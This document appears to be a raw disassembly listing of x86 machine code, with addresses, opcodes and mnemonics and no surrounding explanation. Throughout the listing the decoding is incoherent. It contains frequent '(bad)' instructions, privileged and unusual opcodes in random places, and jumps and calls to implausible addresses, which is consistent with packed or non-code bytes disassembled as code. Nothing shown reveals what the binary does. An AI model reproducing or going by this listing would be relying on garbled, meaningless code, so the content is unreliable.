  418f26:	push   eax
  418f27:	sar    BYTE PTR [eax],1
  418f29:	mov    bh,0x3e
  418f2b:	push   cs
  418f2c:	cmp    DWORD PTR [edi-0x4cff3f4],esi
  418f32:	add    DWORD PTR [ecx+0x12],ebp
  418f35:	dec    edx
  418f36:	(bad)  
  418f37:	mov    eax,edx
  418f39:	in     al,dx
  418f3a:	adc    DWORD PTR [ecx],esi
  418f3c:	pop    esi
  418f3d:	inc    ecx
  418f3e:	leave  
  418f3f:	or     DWORD PTR [eax],ebx
  418f41:	gs push ebp
  418f43:	add    ah,ch
  418f45:	into   
  418f46:	in     al,dx
  418f47:	enter  0xb756,0xf0
  418f4b:	push   cs
  418f4c:	xor    DWORD PTR [edi-0x4fff3ff],0x790f2b38
  418f56:	or     cl,BYTE PTR [ecx+0x7d85fc00]
  418f5c:	jnp    0x74421464
  418f62:	test   DWORD PTR [ebx+0x1cfae40f],ecx
  418f68:	add    BYTE PTR [edi],cl
  418f6a:	mov    edi,DWORD PTR [ecx-0x78]
  418f6d:	ltr    WORD PTR [ecx-0x7b]
  418f71:	dec    DWORD PTR [edi]
  418f73:	clc    
  418f74:	out    0x45,eax
  418f76:	add    BYTE PTR [eax],cl
  418f78:	cmp    ebx,0xffffff8c
  418f7b:	jge    0x418f7d
  418f7d:	jb     0x418f8f
  418f7f:	je     0x508fff
  418f85:	pop    edx
  418f86:	push   esi
  418f87:	mov    ecx,DWORD PTR [edi]
  418f89:	in     al,dx
  418f8a:	rol    DWORD PTR [ebp+0x0],1
  418f8d:	or     DWORD PTR [ebx+0xfb8c08],0x4d
  418f94:	cmp    DWORD PTR [ecx],0xfffffff0
  418f97:	hlt    
  418f98:	mov    esp,DWORD PTR [eax+0xf034d2b]
  418f9e:	(bad)  
  418fa0:	push   eax
  418fa1:	jns    0xb841741f
  418fa7:	lock push cs
  418fa9:	ror    edx,0x3
  418fac:	test   BYTE PTR [ecx+0x5500e800],cl
  418fb2:	dec    eax
  418fb3:	rcpps  xmm4,XMMWORD PTR [ecx+0x4d]
  418fb7:	(bad)  
  418fb8:	mov    esi,0x7f33ff5f
  418fbd:	inc    eax
  418fbe:	test   DWORD PTR [edx],eax
  418fc0:	je     0x418f82
  418fc2:	mov    ecx,ecx
  418fc4:	adc    DWORD PTR [ebp-0xc],0xffffffec
  418fc8:	and    eax,DWORD PTR [eax+0xf0103]
  418fce:	jp     0x418fbc
  418fd0:	rcpps  xmm3,XMMWORD PTR [edx-0x25]
  418fd4:	add    edx,DWORD PTR [edi+0x74]
  418fd7:	sbb    BYTE PTR [ebp+0x4d001484],cl
  418fdd:	add    BYTE PTR [ebp-0x74c48bbb],al
  418fe3:	je     0x418f68
  418fe5:	cmp    eax,edi
  418fe7:	js     0x41900c
  418fe9:	add    eax,0xeb0fc003
  418fee:	jns    0x418f7b
  418ff0:	vmread DWORD PTR [ecx+0x45],ebx
  418ff4:	add    ecx,DWORD PTR [ebx+0x508d1c74]
  418ffa:	adc    al,0x8b
  418ffc:	jge    0x419012
  418ffe:	mov    edi,DWORD PTR [eax-0x4]
  419001:	add    edi,DWORD PTR [edi]
  419003:	or     bh,bh
  419005:	push   ebp
  419006:	push   es
  419007:	mov    DWORD PTR [ebp-0x4],ebx
  41900a:	add    edi,esi
  41900c:	pop    es
  41900d:	add    esi,DWORD PTR [edi-0x48ccf183]
  419013:	mov    DWORD PTR [esp+esi*8],ecx
  419016:	inc    ebp
  419017:	pop    ebp
  419018:	xor    DWORD PTR [esi-0x4],0x3b
  41901c:	add    edx,DWORD PTR [ecx+edi*1]
  41901f:	push   es
  419020:	clc    
  419021:	mov    bh,0xdb
  419023:	jp     0x418fdc
  419025:	add    cl,BYTE PTR [esi]
  419027:	div    DWORD PTR [edi+0x4d8b0c1c]
  41902d:	test   edi,edi
  41902f:	je     0x419025
  419031:	mov    eax,ecx
  419033:	or     BYTE PTR [ebx],al
  419035:	dec    BYTE PTR [ecx+0x7d3bec7d]
  41903b:	jbe    0x4190af
  41903d:	mov    ecx,DWORD PTR [ebx-0x488017f4]
  419043:	add    ecx,DWORD PTR [esi]
  419045:	cmp    DWORD PTR [edi+0x45fe0cf8],esi
  41904b:	add    eax,DWORD PTR [ebx-0x287af783]
  419051:	je     0x4190a0
  419053:	mov    DWORD PTR [ecx],edi
  419055:	mov    esi,eax
  419057:	hlt    
  419058:	or     BYTE PTR [ecx+0x7dfff4ff],0x5b
  41905f:	jb     0x419021
  419061:	jmp    0x41904e
  419063:	xor    esi,DWORD PTR [ebx]
  419065:	pop    edi
  419066:	pop    esi
  419067:	pop    ebx
  419068:	ret    
  419069:	ret    0x8b
  41906c:	mov    ecx,DWORD PTR [ebx+0x2c008390]
  419072:	xor    DWORD PTR [ecx],0xc
  419075:	pushf  
  419076:	xor    ecx,DWORD PTR [ecx+0x4539fc56]
  41907c:	wrmsr  
  41907e:	test   DWORD PTR [eax+eax*1+0xcfc8b8b],ebx
  419085:	dec    ebp
  419086:	ret    
  419087:	mov    edi,DWORD PTR [esi-0x4]
  41908a:	pop    eax
  41908b:	dec    ebp
  41908c:	jne    0x419019
  41908e:	xor    edi,esp
  419090:	inc    eax
  419091:	dec    ebp
  419092:	jbe    0x4190e7
  419094:	inc    eax
  419095:	pop    ebp
  419096:	add    edx,DWORD PTR [esi+0x8]
  419099:	push   ebp
  41909a:	dec    eax
  41909b:	push   ecx
  41909c:	mov    eax,edi
  41909e:	and    al,0xf0
  4190a0:	jo     0x41908d
  4190a2:	mov    eax,DWORD PTR [ebx]
  4190a4:	sbb    BYTE PTR [ebp+0x4d],cl
  4190a7:	mov    eax,DWORD PTR [ebx]
  4190a9:	nop
  4190aa:	or     BYTE PTR [eax],al
  4190ac:	jne    0x419105
  4190ae:	cmp    ebx,DWORD PTR [edi+esi*2-0x3cc76ce]
  4190b5:	xor    edi,edi
  4190b7:	add    edi,DWORD PTR [ebp+0x3]
  4190ba:	cmp    DWORD PTR [ecx+0xbcfe8fc],ecx
  4190c0:	js     0x419046
  4190c2:	jae    0x4190c6
  4190c4:	(bad)  
  4190c6:	xor    al,0x5d
  4190c8:	jmp    0x419055
  4190ca:	mov    ecx,DWORD PTR [ecx*4+0x33dfb1de]
  4190d1:	fdecstp 
  4190d3:	test   BYTE PTR [edi],ah
  4190d5:	add    bh,BYTE PTR [ebp+0x0]
  4190d8:	add    ebx,DWORD PTR [ebp-0x77]
  4190db:	mov    edi,eax
  4190dd:	cmp    al,0x0
  4190e0:	adc    dh,BYTE PTR [ebx]
  4190e2:	jge    0x4190e7
  4190e4:	mov    edi,DWORD PTR [ebx]
  4190e6:	jl     0x4190f7
  4190e8:	clc    
  4190e9:	dec    edi
  4190ea:	jge    0x4190ec
  4190ec:	mov    eax,DWORD PTR [ebx]
  4190ee:	jb     0x4190f8
  4190f0:	mov    ecx,DWORD PTR [ebp-0x8]
  4190f3:	mov    edi,edi
  4190f5:	xor    edx,DWORD PTR [eax]
  4190f7:	add    edi,DWORD PTR [ebx]
  4190f9:	mov    DWORD PTR [ebp-0x10],edi
  4190fc:	inc    edi
  4190fd:	pop    ebp
  4190fe:	jge    0x41913b
  419100:	cmp    esi,DWORD PTR [esp+edi*8-0x75]
  419104:	mov    edx,0xc05d87f0
  419109:	imul   ebx,DWORD PTR [esi+0x14],0xffffffc9
  41910d:	fimul  WORD PTR [eax]
  41910f:	fist   WORD PTR [ebp+0x1c]
  419112:	in     al,dx
  419113:	jne    0x419101
  419115:	mov    edi,DWORD PTR [edx-0x7a27a10]
  41911b:	imul   edx,DWORD PTR [ebp+0x14],0xffffffc7
  41911f:	fdivp  st(0),st
  419121:	fild   WORD PTR [ebp+0x4510f85c]
  419127:	test   BYTE PTR [ebx+0x4d00fc02],cl
  41912d:	inc    ebp
  41912e:	mov    ecx,DWORD PTR [ebx+0x454dfcfc]
  419134:	mov    ebp,DWORD PTR [ebx-0x4]
  419137:	adc    al,0x8b
  419139:	rcl    DWORD PTR [eax],0x48
  41913c:	mov    esi,0x7080803
  419141:	fiadd  WORD PTR [ebp+0x4d]
  419144:	(bad)  
  419145:	mov    edx,DWORD PTR [edx-0x4]
  419148:	mov    edx,DWORD PTR [ebp-0x4]
  41914b:	xor    ebx,DWORD PTR [ebx+0x330103]
  419151:	mov    DWORD PTR [edi+0x872dc],edi
  419157:	xlat   BYTE PTR ds:[ebx]
  419158:	into   
  419159:	ffreep st(6)
  41915b:	retf   0x6c7
  41915e:	iret   
  41915f:	dec    ebp
  419160:	inc    ebp
  419161:	mov    DWORD PTR [ebx],edi
  419163:	fmul   QWORD PTR [edi]
  419165:	dec    ebp
  419166:	jnp    0x41919b
  419168:	add    BYTE PTR [ebx],al
  41916a:	mov    ecx,DWORD PTR [esp+edi*8]
  41916d:	inc    ebp
  41916e:	dec    ebp
  41916f:	lea    esi,[ebx]
  419171:	add    DWORD PTR [ebx],eax
  419173:	jb     0x4191b0
  419175:	add    BYTE PTR [edi],cl
  419177:	inc    ebp
  419178:	imul   eax,edi,0x858bd800
  41917e:	cld    
  41917f:	clc    
  419180:	mov    DWORD PTR [ebp+0x0],eax
  419183:	inc    DWORD PTR [eax]
  419185:	or     al,0xde
  419187:	sbb    bh,0x1
  41918a:	retf   
  41918b:	add    BYTE PTR [eax+edx*1+0x33004d02],al
  419192:	dec    ebp
  419193:	add    ecx,DWORD PTR [ecx-0x250b2b77]
  419199:	enter  0x12de,0xdf
  41919d:	inc    ebp
  41919e:	pop    ebp
  41919f:	dec    DWORD PTR [ebx-0x257f0ff4]
  4191a5:	add    DWORD PTR [edx],edx
  4191a7:	add    BYTE PTR [ebp+0x50],dl
  4191aa:	mov    ecx,DWORD PTR [ecx+0x45d2f4fc]
  4191b0:	xor    ecx,DWORD PTR [eax-0x38c699fd]
  4191b6:	or     ah,al
  4191b8:	pop    ss
  4191b9:	cdq    
  4191ba:	push   ebp
  4191bb:	clc    
  4191bc:	mov    eax,DWORD PTR [ebp-0x4]
  4191bf:	xor    edx,edx
  4191c1:	add    esi,DWORD PTR [ebx]
  4191c3:	cmp    eax,DWORD PTR [ebx]
  4191c5:	hlt    
  4191c6:	cmp    DWORD PTR [ebx],esp
  4191c8:	or     al,BYTE PTR [ebp+0xf]
  4191cb:	mov    eax,DWORD PTR [edx]
  4191cd:	loopne 0x4191cf
  4191cf:	(bad)  
  4191d0:	mov    ecx,esi
  4191d2:	cld    
  4191d3:	pushf  
  4191d4:	pop    ebp
  4191d5:	pushf  
  4191d6:	mov    esi,DWORD PTR [edx]
  4191d8:	lock mov eax,eax
  4191db:	adc    BYTE PTR [ebx],al
  4191dd:	or     BYTE PTR [ebx+0x4d001001],0xcf
  4191e4:	xor    ebp,DWORD PTR [edi+0x50e45189]
  4191ea:	dec    ebp
  4191eb:	mov    ecx,DWORD PTR [ebx-0x31390304]
  4191f1:	(bad)  
  4191f2:	iret   
  4191f3:	inc    ebp
  4191f4:	(bad)  
  4191f5:	jne    0x419244
  4191f7:	mov    ecx,DWORD PTR [ebx+0x3c603d8]
  4191fd:	(bad)  
  4191fe:	cmp    ebx,eax
  419200:	je     0x419188
  419202:	add    edi,edi
  419204:	or     bh,bh
  419206:	dec    ebp
  419207:	inc    ebp
  419208:	mov    esi,DWORD PTR [ebx]
  41920a:	cld    
  41920b:	add    ecx,esi
  41920d:	cmp    ecx,DWORD PTR [eax-0xc]
  419210:	mov    edx,DWORD PTR [edi]
  419212:	or     BYTE PTR [ebp-0x7c],al
  419215:	mov    ebx,DWORD PTR [eax+ebp*8-0x7b7639ce]
  41921c:	or     al,0x9c
  41921e:	inc    ebp
  41921f:	xor    bh,BYTE PTR [ecx+ecx*4]
  419222:	pushf  
  419223:	call   0x5281b3
  419228:	jne    0x4191f1
  41922a:	mov    ebp,esp
  41922c:	fcomp  DWORD PTR [ebx]
  41922e:	add    BYTE PTR [ecx],al
  419230:	inc    DWORD PTR [ebp-0x75]
  419233:	(bad)  
  419234:	cld    
  419235:	add    al,0xce
  419237:	mov    ecx,edi
  419239:	cld    
  41923a:	inc    ebp
  41923b:	fidivr WORD PTR [ebx]
  41923d:	fbstp  TBYTE PTR [ebp-0x3e]
  419240:	mov    eax,DWORD PTR [eax]
  419242:	adc    BYTE PTR [ebx-0x3974038b],cl
  419248:	fadd   st,st(7)
  41924a:	add    BYTE PTR [ebp-0x1],al
  41924d:	mov    ecx,DWORD PTR [esp+edi*8]
  419250:	inc    ebp
  419251:	mov    bh,0xc7
  419254:	loopne 0x41929b
  419256:	sbb    ecx,DWORD PTR [ebx+0x4545fc7f]
  41925c:	sbb    BYTE PTR [ebx],dh
  41925e:	pushf  
  41925f:	add    ecx,DWORD PTR [ebx-0x398b03c5]
  419265:	mov    eax,edi
  419267:	cwde   
  419268:	inc    ebp
  419269:	inc    ebp
  41926a:	jne    0x4191f7
  41926c:	mov    esp,esp
  41926e:	clc    
  41926f:	add    al,0x4d
  419271:	mov    DWORD PTR [ebx],esi
  419273:	or     al,0x33
  419275:	inc    ebp
  419276:	lea    ecx,[ebx-0x398d13fd]
  41927c:	add    bh,al
  41927e:	inc    ebp
  41927f:	ror    DWORD PTR [ebx+0x45d829],0x8b
  419286:	add    ebp,esp
  419288:	shufps xmm1,xmm3,0xc7
  41928c:	(bad)  
  41928d:	jmp    0x7486cdb6
  419292:	xor    ecx,DWORD PTR [ebx+0x453bec03]
  419298:	hlt    
  419299:	mov    ecx,DWORD PTR [edi]
  41929b:	fadd   DWORD PTR [ebp+0x0]
  41929e:	xor    ecx,DWORD PTR [edi]
  4192a0:	add    ecx,ecx
  4192a2:	cmp    edi,edi
  4192a4:	pmuludq mm7,QWORD PTR [edx+0x50]
  4192a8:	(bad)  
  4192a9:	jmp    0x419236
  4192ab:	mov    edi,esp
  4192ad:	or     al,0xc6
  4192af:	inc    ebp
  4192b0:	(bad)  
  4192b1:	mov    eax,DWORD PTR [ebp+0x10]
  4192b4:	jne    0x41923f
  4192b6:	mov    eax,DWORD PTR [ecx]
  4192b8:	clc    
  4192b9:	add    BYTE PTR [ebp-0x40],cl
  4192bc:	xor    edx,DWORD PTR [eax-0x73]
  4192bf:	jne    0x4192c2
  4192c1:	push   DWORD PTR [edx+0x8]
  4192c4:	add    BYTE PTR [ebp+0x45],al
  4192c7:	mov    ebp,ecx
  4192c9:	cld    
  4192ca:	add    BYTE PTR [ebp+0x0],cl
  4192cd:	xor    eax,DWORD PTR [ebp+0x3]
  4192d0:	mov    DWORD PTR [ebx],edi
  4192d2:	adc    cl,BYTE PTR [ebx+0x110cf8c7]
  4192d8:	sub    eax,0x5d330e4d
  4192dd:	lea    esi,[ebx]
  4192df:	add    DWORD PTR [ebx],eax
  4192e1:	jb     0x4192cc
  4192e3:	add    BYTE PTR [eax],al
  4192e5:	inc    ebp
  4192e6:	add    bl,ch
  4192e8:	inc    ebp
  4192e9:	mov    esi,DWORD PTR [ebx]
  4192eb:	or     al,0x3
  4192ed:	(bad)  
  4192ee:	mov    edi,eax
  4192f0:	in     al,dx
  4192f1:	scas   eax,DWORD PTR es:[edi]
  4192f2:	inc    ebp
  4192f3:	mov    esi,DWORD PTR [ebx]
  4192f5:	in     al,0x3
  4192f7:	add    al,0x89
  4192f9:	mov    ecx,DWORD PTR [eax+edi*8]
  4192fc:	dec    ebp
  4192fd:	(bad)  
  4192fe:	mov    ebx,DWORD PTR [esp+ebx*8-0x30cd3164]
  419305:	mov    ecx,eax
  419307:	cld    
  419308:	push   es
  419309:	dec    ebp
  41930a:	add    al,0x33
  41930c:	mov    DWORD PTR [ebx],eax
  41930e:	in     al,dx
  41930f:	cmp    DWORD PTR [ebp-0x67],eax
  419312:	mov    eax,DWORD PTR [ebp-0xba0068]
  419318:	mov    edx,DWORD PTR [ebp-0x4]
  41931b:	mov    ecx,DWORD PTR [ebp-0x18]
  41931e:	xor    ecx,DWORD PTR [ebp+0x3]
  419321:	cmp    DWORD PTR [ebx],0x8b32749b
  419327:	xor    edi,esp
  419329:	jmp    0xff75907b
  41932e:	add    ecx,DWORD PTR [ebp-0x3f]
  419331:	xor    ebx,DWORD PTR [edi]
  419333:	add    eax,ecx
  419335:	cmp    ebx,DWORD PTR [eax]
  419337:	mov    ecx,DWORD PTR [ebp-0x4]
  41933a:	mov    ecx,DWORD PTR [eax]
  41933c:	adc    BYTE PTR [ebp-0x80],al
  41933f:	jmp    0x419342
  419341:	mov    eax,DWORD PTR [eax]
  419343:	cld    
  419344:	mov    bh,0xc6
  419346:	push   ecx
  419347:	(bad)  
  419348:	jne    0x4193a8
  41934a:	dec    ecx
  41934c:	or     BYTE PTR [ecx+ebx*1],cl
  41934f:	push   ebp
  419350:	inc    ebp
  419351:	in     al,dx
  419352:	add    ebp,esp
  419354:	or     bh,al
  419356:	dec    ebp
  419357:	cld    
  419358:	mov    eax,DWORD PTR [ebp+0x4500f8d8]
  41935e:	xor    DWORD PTR [eax],0x2
  419361:	pushf  
  419362:	dec    DWORD PTR [ebx+0x45510cf4]
  419368:	mov    DWORD PTR [ebx+0x5545fc0c],ecx
  41936e:	mov    edx,DWORD PTR [ecx+0xc]
  419371:	xor    eax,esi
  419373:	mov    edx,0xc172c7
  419378:	inc    ebp
  419379:	mov    esi,DWORD PTR [ebp+0x8]
  41937c:	mov    eax,edx
  41937e:	call   0x84c65a73
  419383:	add    DWORD PTR [eax+eax*1-0x7476bace],ebx
  41938a:	call   0x4db1a397
  41938f:	push   edi
  419390:	xor    esi,DWORD PTR [ebp+0x3]
  419393:	(bad)  
  419394:	pmulhuw mm0,mm1
  419397:	test   DWORD PTR [ebp-0x8],ecx
  41939a:	mov    DWORD PTR [ebp-0x67],eax
  41939d:	mov    eax,DWORD PTR [ebp-0x4]
  4193a0:	xor    edi,DWORD PTR [ebp-0x73]
  4193a3:	xor    eax,DWORD PTR [ebx]
  4193a5:	xor    esi,DWORD PTR [edx+0x3]
  4193a8:	add    BYTE PTR [ecx],bh
  4193aa:	inc    ebp
  4193ab:	(bad)  
  4193ac:	mov    edx,DWORD PTR [ebp-0x7b39fe1c]
  4193b2:	mov    DWORD PTR [eax],0x750f0004
  4193b8:	sub    ecx,DWORD PTR [ebx-0x7974f701]
  4193be:	lock add BYTE PTR [ebp+0x0],al
  4193c2:	mov    esi,DWORD PTR [ebp-0x2c]
  4193c5:	mov    ebp,edx
  4193c7:	or     al,0x72
  4193c9:	ja     0x4193cb
  4193cb:	mov    edx,esi
  4193cd:	cld    
  4193ce:	(bad)  
  4193d1:	cli    
  4193d2:	mov    esi,DWORD PTR [ebp-0x4]
  4193d5:	cmp    ecx,esi
  4193d7:	bswap  edi
  4193d9:	(bad)
  4193dd:	mov    esi,DWORD PTR [ebp-0x4]
  4193e0:	mov    esi,ecx
  4193e2:	clc    
  4193e3:	repnz add esi,DWORD PTR [ebp+0x45]
  4193e7:	push   ebx
  4193e8:	xor    eax,DWORD PTR [ebp+0x3]
  4193eb:	xor    bl,BYTE PTR [edi-0x64]
  4193ee:	pop    ebx
  4193ef:	jmp    0x4194b6
  4193f4:	mov    esi,DWORD PTR [ebp-0x7d]
  4193f7:	xor    ebp,DWORD PTR [eax]
  4193f9:	lea    eax,[ebp-0x8]
  4193fc:	xor    edx,esi
  4193fe:	pushf  
  4193ff:	out    dx,eax
  419400:	(bad)  
  419401:	neg    eax
  419403:	ins    DWORD PTR es:[edi],dx
  419404:	test   esi,edi
  419406:	clc    
  419407:	pop    esp
  419408:	inc    ebp
  419409:	or     BYTE PTR [ecx+0x450f0c7d],cl
  41940f:	xor    edi,DWORD PTR [ecx+0x70f08e6]
  419415:	add    cl,al
  419417:	jne    0x4193b5
  419419:	mov    esi,DWORD PTR [edx]
  41941b:	in     al,dx
  41941c:	push   esi
  41941d:	xor    BYTE PTR [ebp-0xe],dh
  419420:	add    edi,esi
  419422:	cmp    esi,DWORD PTR [edi+0xc21c10f]
  419428:	add    cl,bh
  41942a:	mov    edi,DWORD PTR [ebp+0x8]
  41942d:	mov    DWORD PTR [ebp-0x14],esi
  419430:	add    esi,DWORD PTR [ebp+0x3c]
  419433:	mov    ecx,DWORD PTR [ecx+0x45f10c08]
  419439:	mov    ah,0x3c
  41943b:	pushf  
  41943c:	pushf  
  41943d:	xor    cl,BYTE PTR [ebx+0x75e0e489]
  419443:	jne    0x4193d0
  419445:	mov    ecx,DWORD PTR [esp+ebp*8]
  419448:	icebp  
  419449:	icebp  
  41944a:	shl    edx,0xf2
  41944d:	(bad)  
  41944e:	mov    ah,0x16
  419450:	pop    eax
  419451:	jne    0x4193e6
  419453:	mov    ecx,DWORD PTR [edi]
  419455:	in     al,dx
  419456:	jmp    0x419449
  419458:	add    dl,dh
  41945a:	mov    edi,esi
  41945c:	or     al,0x8
  41945e:	inc    ebp
  41945f:	jne    0x419464
  419461:	mov    esp,DWORD PTR [eax-0x74c1ff24]
  419467:	ret    
  419468:	or     bh,bh
  41946a:	jge    0x419454
  41946c:	sub    ebx,DWORD PTR [edi+0x17d5d34]
  419472:	xor    edi,eax
  419474:	add    esi,DWORD PTR [ebp-0x77]
  419477:	mov    ebx,esp
  419479:	clc    
  41947a:	neg    DWORD PTR [ebp-0x7c]
  41947d:	xor    eax,DWORD PTR [eax]
  41947f:	cmp    eax,DWORD PTR [eax]
  419481:	repz jne 0x419419
  419484:	xor    eax,DWORD PTR [ecx]
  419486:	add    ebx,DWORD PTR [eax]
  419488:	mov    DWORD PTR [ebp-0x8],eax
  41948b:	mov    eax,edi
  41948d:	cld    
  41948e:	lock pop eax
  419490:	test   DWORD PTR [ebx],esi
  419492:	clc    
  419493:	add    edx,DWORD PTR [edi-0x740bff77]
  419499:	fdivp  st(4),st
  41949b:	test   ecx,esi
  41949d:	(bad)  
  41949e:	jnp    0x41949f
  4194a0:	add    ecx,DWORD PTR [ebx-0x14c4272f]
  4194a6:	jae    0x419433
  4194a8:	sub    edi,esp
  4194aa:	(bad)  
  4194ab:	shl    DWORD PTR [eax-0x3e],0x89
  4194af:	leave  
  4194b0:	call   0x81974bbd
  4194b5:	in     al,dx
  4194b6:	(bad)  
  4194b7:	in     al,dx
  4194b8:	add    bh,al
  4194ba:	mov    esp,edi
  4194bc:	in     al,dx
  4194bd:	test   DWORD PTR [ebp-0x8],edi
  4194c0:	mov    eax,DWORD PTR [ebp+0x2b]
  4194c3:	xor    BYTE PTR [ebx],al
  4194c5:	pushf  
  4194c6:	jnp    0x573090ff
  4194cc:	xor    edx,DWORD PTR [ebp-0x77]
  4194cf:	push   ecx
  4194d0:	loopne 0x419505
  4194d2:	jne    0x41948f
  4194d4:	mov    esi,DWORD PTR [edx-0x20]
  4194d7:	add    BYTE PTR [ebp-0x3d],bh
  4194da:	xor    eax,DWORD PTR [ebp-0x73]
  4194dd:	mov    edi,DWORD PTR [esi]
  4194df:	cld    
  4194e0:	jb     0x4194a8
  4194e2:	add    bl,al
  4194e4:	jne    0x41952b
  4194e6:	mov    edx,DWORD PTR [edi-0x10]
  4194e9:	jge    0x419568
  4194eb:	mov    esi,DWORD PTR [ebx]
  4194ed:	lock add ecx,DWORD PTR [ebp+0x3b]
  4194f1:	xor    esi,DWORD PTR [ebp-0x77]
  4194f4:	mov    esi,eax
  4194f6:	lock inc ebp
  4194f8:	jge    0x41952b
  4194fa:	xor    ebx,DWORD PTR [ebx+eax*1+0x75f83b8b]
  419501:	dec    ebp
  419502:	mov    esi,DWORD PTR [ebx]
  419504:	loopne 0x41948f
  419506:	jge    0x419500
  419508:	add    DWORD PTR [ebp-0x7d],eax
  41950b:	icebp  
  41950c:	add    bl,BYTE PTR [ebp+ecx*2-0x740b8a75]
  419513:	dec    ebp
  419514:	hlt    
  419515:	xor    ebx,DWORD PTR [ebp-0x77]
  419518:	mov    esi,esp
  41951a:	in     al,0x45
  41951c:	jge    0x41955b
  41951e:	mov    ebx,DWORD PTR [esp+ecx*1-0x43130e75]
  419525:	dec    ebp
  419526:	pop    esp
  419527:	xor    edx,DWORD PTR [ebx+0x3ec7389]
  41952d:	inc    ebp
  41952e:	hlt    
  41952f:	xor    DWORD PTR [ebp-0x61],esi
  419532:	mov    edi,DWORD PTR [eax+0xf19504]
  419538:	repnz mov DWORD PTR [ebp+0x20],ebx
  41953c:	cmp    eax,DWORD PTR [ebp+0xf]
  41953f:	test   DWORD PTR [edi+ecx*1-0x1],edx
  419543:	fistp  WORD PTR [ebx+0x0]
  419546:	inc    ebp
  419547:	mov    ebx,DWORD PTR [edi+0xc]
  41954a:	add    eax,eax
  41954c:	inc    ebp
  41954d:	test   BYTE PTR [ebx],dh
  41954f:	add    eax,DWORD PTR [ebx]
  419551:	add    BYTE PTR [esi+0x45],bl
  419554:	ret    0x85
  419557:	jnp    0x54421926
  41955d:	inc    bp
  41955f:	inc    ebp
  419560:	xor    DWORD PTR [ecx+0xc78a9c],edi
  419566:	fdiv   QWORD PTR [ebx]
  419568:	test   DWORD PTR [ecx+0x453bf8],edi
  41956e:	push   ebx
  41956f:	add    edi,DWORD PTR [esi+0x708088b]
  419575:	cmp    esi,eax
  419577:	setl   BYTE PTR [ecx-0x74fcffce]
  41957e:	mov    esp,edi
  419580:	call   0x33ccdad2
  419585:	or     BYTE PTR [ebx],al
  419587:	inc    ecx
  419588:	mov    DWORD PTR [ecx+0x408b0ce0],ecx
  41958e:	and    BYTE PTR [ebp-0x7074f0bb],al
  419594:	lock add cl,al
  419597:	mov    DWORD PTR [ebp-0x2c],0xf8f08581
  41959e:	mov    ch,0x45
  4195a0:	clc    
  4195a1:	xor    eax,DWORD PTR [ebp+0x3]
  4195a4:	mov    ecx,DWORD PTR [ecx+0x45c1d4f8]
  4195aa:	inc    ebp
  4195ab:	mov    eax,DWORD PTR [ecx-0x7aff0770]
  4195b1:	mov    edi,eax
  4195b3:	mov    eax,DWORD PTR [ebp+0x3c]
  4195b6:	mov    ecx,DWORD PTR [eax]
  4195b8:	hlt    
  4195b9:	inc    ebp
  4195ba:	ror    DWORD PTR [ebx+0x818c45],0xf4
  4195c1:	mov    eax,DWORD PTR [ebp+0x45e4f889]
  4195c7:	push   ebp
  4195c8:	mov    edi,DWORD PTR [ebx]
  4195ca:	in     al,dx
  4195cb:	jne    0x41958e
  4195cd:	mov    eax,DWORD PTR [ebp-0x28]
  4195d0:	add    DWORD PTR [eax],0xe8058dec
  4195d6:	clc    
  4195d7:	mov    esi,DWORD PTR [edi-0x8]
  4195da:	add    dh,dl
  4195dc:	rol    WORD PTR [ebp-0x1],cl
  4195e0:	mov    edx,DWORD PTR [eax+0x8]
  4195e3:	jne    0x4195a5
  4195e5:	inc    DWORD PTR [esp+ebx*1-0x74ffb2fd]
  4195ec:	inc    ebp
  4195ed:	push   esp
  4195ee:	test   DWORD PTR [ecx+0xf],ecx
  4195f1:	sub    edx,esp
  4195f3:	add    eax,DWORD PTR [eax]
  4195f5:	and    BYTE PTR [ebx-0x3fc4e7b0],cl
  4195fb:	add    BYTE PTR [ebx+ecx*4-0x78ffdffd],al
  419602:	mov    eax,DWORD PTR [ecx]
  419604:	and    BYTE PTR [eax],al
  419606:	adc    BYTE PTR ds:[eax],al
  419609:	inc    ebp
  41960a:	inc    cx
  41960d:	push   esp
  41960e:	add    al,0x75
  419610:	add    BYTE PTR [edx+0x66],dl
  419613:	enter  0xc1,0x4d
  419617:	mov    esp,DWORD PTR [esi+0x20]
  41961a:	add    DWORD PTR [ecx-0x7b],eax
  41961d:	add    eax,DWORD PTR [ebx]
  41961f:	str    WORD PTR [eax+0x45]
  419623:	lea    ecx,[ebx+0x45890801]
  419629:	sbb    BYTE PTR [ebx],al
  41962b:	dec    ebp
  41962c:	cmp    al,0xf
  41962e:	inc    ebp
  41962f:	push   eax
  419630:	mov    esi,DWORD PTR [ebx]
  419632:	push   eax
  419633:	add    eax,eax
  419635:	mov    DWORD PTR [esp+ecx*1-0x7bff2efd],eax
  41963c:	inc    ebp
  41963d:	add    BYTE PTR [ecx],dh
  41963f:	add    BYTE PTR [ebp+ecx*2+0x3d4338b],cl
  419646:	(bad)  
  419647:	mov    ebx,eax
  419649:	loopne 0x419690
  41964b:	dec    ebp
  41964c:	mov    ecx,DWORD PTR [edi]
  41964e:	cld    
  41964f:	push   eax
  419650:	xchg   DWORD PTR [ebx],esi
  419652:	add    DWORD PTR [ebx],ebp
  419654:	add    BYTE PTR [ebx],ch
  419656:	or     BYTE PTR [ecx],bh
  419658:	dec    ecx
  419659:	loopne 0x41965e
  41965b:	xchg   DWORD PTR [ebx-0x78ff0400],ecx
  419661:	push   ebp
  419662:	add    DWORD PTR [ebx+0x55100800],eax
  419668:	dec    ebp
  419669:	jmp    0x4195f4
  41966b:	mov    esp,DWORD PTR [eax]
  41966d:	sbb    dl,dl
  41966f:	inc    eax
  419670:	xor    ecx,DWORD PTR [ebp+0x4501ff87]
  419676:	add    BYTE PTR [ebx+0x74528555],cl
  41967c:	push   ebp
  41967d:	div    DWORD PTR [ebx]
  41967f:	and    eax,DWORD PTR [ebx]
  419681:	add    edx,DWORD PTR [edx-0x30]
  419684:	jno    0x419611
  419686:	inc    DWORD PTR [eax+eiz*1]
  419689:	inc    ebp
  41968a:	push   eax
  41968b:	push   eax
  41968c:	mov    esp,DWORD PTR [edi-0x74beff1c]
  419692:	mov    edi,esp
  419694:	push   eax
  419695:	inc    ebp
  419696:	enter  0x458b,0x8
  41969a:	push   ecx
  41969b:	(bad)  
  41969c:	call   0x10ba074
  4196a1:	pop    ss
  4196a2:	push   ebp
  4196a3:	mov    ecx,DWORD PTR [ebx+0x489408]
  4196a9:	mov    ecx,DWORD PTR [ecx+0xc458b04]
  4196af:	push   ecx
  4196b0:	jo     0x41969a
  4196b2:	inc    DWORD PTR [edi]
  4196b4:	or     BYTE PTR [eax],al
  4196b6:	call   0xcc9e00
  4196bb:	fmul   QWORD PTR [ebp+0x55]
